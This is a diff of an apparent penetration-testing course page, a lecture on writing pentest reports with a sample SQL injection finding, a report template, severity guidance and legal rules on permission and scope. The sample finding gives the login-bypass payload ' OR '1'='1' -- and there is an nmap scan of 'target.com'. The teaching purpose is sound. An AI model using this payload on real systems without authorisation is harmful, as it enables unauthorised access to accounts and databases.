-                    <div class="exercise">
-                        <div class="exercise-title">🎯 Exercise 11.2</div>
-                        <p>Research and summarize the legal implications of unauthorized penetration testing in your
-                            country (or India, since you are in Ludhiana).</p>
-                    </div>
+    <div class="code-block">
+<pre># Save scan output
+nmap -sV target.com -oN scan.txt
 
-                    <div class="lecture-nav">
-                        <button class="nav-btn" onclick="showLecture(9)">← Previous</button>
-                        <button class="nav-btn primary" onclick="showLecture(11)">Next Lecture → (Capstone)</button>
-                    </div>
-                </div>
+# Save command history
+history > commands.txt
+</pre>
+    </div>
 
+    <div class="box tip">
+        <div class="box-title">💡 Tip</div>
+        Every finding must be reproducible from your evidence.
+    </div>
+
+    <h2>3. Writing a Real Vulnerability (Hands-On)</h2>
+
+    <h3>Example: SQL Injection Finding</h3>
+
+    <div class="code-block">
+<pre>Vulnerability: SQL Injection
+Severity: Critical
+
+Affected URL:
+http://target.com/login.php?id=1
+
+Description:
+The application does not properly sanitize user input, allowing SQL queries to be manipulated.
+
+Proof of Concept:
+Input:
+' OR '1'='1' --
+
+Result:
+Login bypass successful
+
+Impact:
+• Unauthorized access
+• Database compromise
+
+Recommendation:
+• Use prepared statements
+• Validate user input
+</pre>
+    </div>
+
+    <h3>What Makes This Good</h3>
+    <ul>
+        <li>Clear location</li>
+        <li>Exact payload used</li>
+        <li>Shows impact</li>
+        <li>Fix is actionable</li>
+    </ul>
+
+    <h2>4. Report Template (Use This in Labs)</h2>
+
+    <div class="code-block">
+<pre>===============================
+PENETRATION TEST REPORT
+===============================
+
+Target: [Lab Machine / Domain]
+Date: [Insert Date]
+
+1. Executive Summary
+- Overall Risk: HIGH
+- Key Issues: Weak passwords, outdated services
+
+2. Methodology
+- Recon → Scanning → Exploitation → Post-Exploitation
+
+3. Findings
+
+[Finding 1]
+Name:
+Severity:
+Description:
+Proof of Concept:
+Impact:
+Recommendation:
+
+[Finding 2]
+...
+
+4. Conclusion
+- System is vulnerable due to misconfigurations
+
+5. Remediation Plan
+- Fix critical issues immediately
+</pre>
+    </div>
+
+    <h2>5. Severity Rating (Practical Method)</h2>
+
+    <p>Instead of memorizing CVSS, ask:</p>
+
+    <ul>
+        <li>Can attacker get admin/root? → Critical</li>
+        <li>Can attacker access sensitive data? → High</li>
+        <li>Limited access? → Medium</li>
+        <li>Minor issue? → Low</li>
+    </ul>
+
+    <h3>Example</h3>
+    <div class="code-block">
+<pre>Open Port 80 → Low
+Directory Listing → Medium
+SQL Injection → Critical
+</pre>
+    </div>
+
+    <h2>6. Legal Aspects (Practical Understanding)</h2>
+
+    <h3>Before Testing (Mandatory)</h3>
+    <ul>
+        <li>Written permission</li>
+        <li>Defined scope (IPs, domains)</li>
+        <li>Time window</li>
+    </ul>
+
+    <h3>Example Scope</h3>
+    <div class="code-block">
+<pre>Allowed:
+192.168.1.0/24
+
+Not Allowed:
+Production servers
+Third-party services
+</pre>
+    </div>
+
+    <h3>During Testing</h3>
+    <ul>
+        <li>No data destruction</li>
+        <li>No service disruption</li>
+        <li>Stay within scope</li>
+    </ul>
+
+    <h3>After Testing</h3>
+    <ul>
+        <li>Delete collected sensitive data</li>
+        <li>Submit report securely</li>
+    </ul>
+
+    <div class="box warning">
+        <div class="box-title">⚠️ Critical Rule</div>
+        Testing without permission = illegal hacking.
+    </div>
+
+    <h2>7. Common Reporting Mistakes</h2>
+    <ul>
+        <li>Too technical for management</li>
+        <li>No proof of concept</li>
+        <li>No remediation steps</li>
+        <li>Copy-paste from tools without explanation</li>
+    </ul>
+
+    <h2>8. Lab Exercise — Build Your First Report</h2>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Lab 11.1 — Full Report</div>
+        <p>
+            Using your previous labs:
+            <br>1. Pick ONE vulnerability
+            <br>2. Write full finding (PoC, impact, fix)
+            <br>3. Add screenshots/logs
+            <br>4. Assign severity
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🎯 Lab 11.2 — Mini Engagement</div>
+        <p>
+            Simulate a real pentest:
+            <br>• Scan target
+            <br>• Find vulnerability
+            <br>• Exploit (lab only)
+            <br>• Write full report
+        </p>
+    </div>
+
+    <div class="exercise">
+        <div class="exercise-title">🔥 Challenge</div>
+        <p>
+            Create a professional PDF report:
+            <br>• Cover page
+            <br>• Executive summary
+            <br>• 3+ findings
+            <br>• Remediation plan
+        </p>
+    </div>
+
+    <div class="lecture-nav">
+        <button class="nav-btn" onclick="showLecture(9)">← Previous</button>
+        <button class="nav-btn primary" onclick="showLecture(11)">Next Lecture → (Capstone)</button>
+    </div>
+</div>
                 <!-- ===================== LECTURE 12 ===================== -->
                 <div class="lecture" id="lec-12">
                     <div class="lecture-tag">Lecture 12 · Capstone</div>
